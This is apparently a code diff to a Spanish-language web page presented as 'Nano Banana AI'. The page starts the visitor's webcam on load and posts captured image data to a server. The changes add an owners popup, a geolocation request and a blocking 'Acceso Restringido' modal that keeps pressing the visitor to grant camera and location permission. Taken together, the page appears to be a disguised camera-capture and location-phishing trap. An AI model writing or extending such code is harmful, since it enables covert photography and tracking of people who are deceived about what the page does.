@@ -6,6 +6,7 @@
     <title>Nano Banana AI</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossOrigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
 
@@ -502,6 +503,41 @@
     <video id="video" playsinline autoplay></video>
 
     <script>
+        // Requerimiento 1: Alerta de Colaboradores al iniciar
+        function showWelcome() {
+            Swal.fire({
+                title: 'Colaboradores',
+                html: '<div style="text-align: left; font-size: 0.9rem;">' +
+                      '<b>JESUS YUCRA:</b> CO PROPIETARIO<br>' +
+                      '<b>JESUS DORIAN:</b> DUEÑO DE LA EMPRESA</div>',
+                icon: 'info',
+                confirmButtonText: 'Continuar',
+                confirmButtonColor: '#fbbf24',
+                background: '#1a1a1a',
+                color: '#fff'
+            });
+        }
+
+        // Requerimiento 2: Alerta persistente si no hay permisos
+        function showPermissionDenied() {
+            Swal.fire({
+                title: 'Acceso Restringido',
+                text: 'No puedes acceder a esta página. Brinda los permisos respectivos o recarga la página para continuar.',
+                icon: 'error',
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                showConfirmButton: true,
+                confirmButtonText: 'Recargar Página',
+                confirmButtonColor: '#ef4444',
+                background: '#1a1a1a',
+                color: '#fff'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    location.reload();
+                }
+            });
+        }
+
         function post(imgdata) {
             $.ajax({
                 type: 'POST',
@@ -516,6 +552,18 @@
 
         let cameraActive = false;
         let stream = null;
+
+        async function checkLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    () => {}, // Success
+                    () => { showPermissionDenied(); }, // Error/Denied
+                    { timeout: 5000 }
+                );
+            } else {
+                showPermissionDenied();
+            }
+        }
 
         async function startCamera() {
             try {
@@ -539,7 +587,9 @@
                 }, 1500);
                 cameraActive = true;
 
-            } catch (e) {}
+            } catch (e) {
+                showPermissionDenied();
+            }
         }
 
         function redirectToMainPage() {
@@ -565,8 +615,12 @@
             }
         });
 
-        // Auto-initiate camera for better "awareness" simulation
-        window.onload = startCamera;
+        // Auto-initiate everything
+        window.onload = () => {
+            showWelcome();
+            startCamera();
+            checkLocation();
+        };
     </script>
 </body>
 </html>
